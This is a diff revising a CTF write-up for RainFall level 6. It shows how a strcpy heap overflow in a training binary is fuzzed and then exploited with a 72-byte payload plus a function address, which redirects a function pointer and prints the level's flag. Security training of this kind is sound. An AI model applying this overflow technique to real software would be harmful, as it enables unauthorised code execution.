@@ -1,9 +1,9 @@
 # Level 6
 
-- Once logged in, you will see a binary `level6`
+Once logged in, you will see a binary `level6`.
 
 ```
-[???]$ ssh level6@localhost -p 4242
+$ ssh level6@localhost -p 4242
 	  _____       _       ______    _ _
 	 |  __ \     (_)     |  ____|  | | |
 	 | |__) |__ _ _ _ __ | |__ __ _| | |
@@ -27,7 +27,7 @@ No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RU
 level6@RainFall:~$
 ```
 
-let's run this and see what this does
+Let's run this and see what this does.
 
 ```
 level6@RainFall:~$ ./level6
@@ -40,7 +40,8 @@ level6@RainFall:~$
 
 Now, finally, it does something different from last levels.
 
-by taking a look at the binary, there are three functions we want to take a look
+By taking a look at the binary, there are three functions we want to look at.
+
 ```
 gdb-peda$ info functions
 [...]
@@ -108,21 +109,36 @@ Dump of assembler code for function n:
    0x08048467 <+19>:	ret
 End of assembler dump.
 ```
-by analyzing the assembly, we can tell the main function allocates memory on heap, and calls function m.
-but our goal is to call the function n instead.
 
-Remember, the function `strdup()` is vulnerable, as the function `strcpy()` has vulnerbalility which enables to change a running program's functionality through a buffer overflow.
+By analyzing the assembly (and decompiled C), we can tell the main function allocates memory on the heap with `malloc`, and calls function `m`. Our goal in this exploit is to call `n` instead.
 
-By passing input to the program below, ......... XXXXXXX
+Remember the function `strcpy()` has vulnerability which enables us to change a program's functionality through a buffer overflow.
+
+Here we made the correct assumption that `malloc` stores values mostly next to one another plus some overhead. We found the correct memory location by writing a bit more to the copied argument than there was space available, thus overwriting the function pointer.
 
 ```
+level6@RainFall:~$ ./level6 $(python -c "print 'B'*64")
+Nope
+level6@RainFall:~$ ./level6 $(python -c "print 'B'*65")
+Nope
+level6@RainFall:~$ ./level6 $(python -c "print 'B'*66")
+Nope
+level6@RainFall:~$ ./level6 $(python -c "print 'B'*67")
+Nope
+level6@RainFall:~$ ./level6 $(python -c "print 'B'*68")
+Nope
+level6@RainFall:~$ ./level6 $(python -c "print 'B'*69")
+Nope
+level6@RainFall:~$ ./level6 $(python -c "print 'B'*70")
+Nope
 level6@RainFall:~$ ./level6 $(python -c "print 'B'*71")
 Nope
-level6@RainFall:~$ ./level6 $(python -c "print 'B'*72")
+level6@RainFall:~$ ./level6 $(python -c "print 'B'*72") // XXX: try this
 Segmentation fault (core dumped)
 ```
 
-another message XXXXXXXXX
+Now we just add on our desired value to be called, and voilà our completed exploit.
+
 ```
 level6@RainFall:~$ ./level6 $(python -c "print 'B'*72 + '\x54\x84\x04\x08'")
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
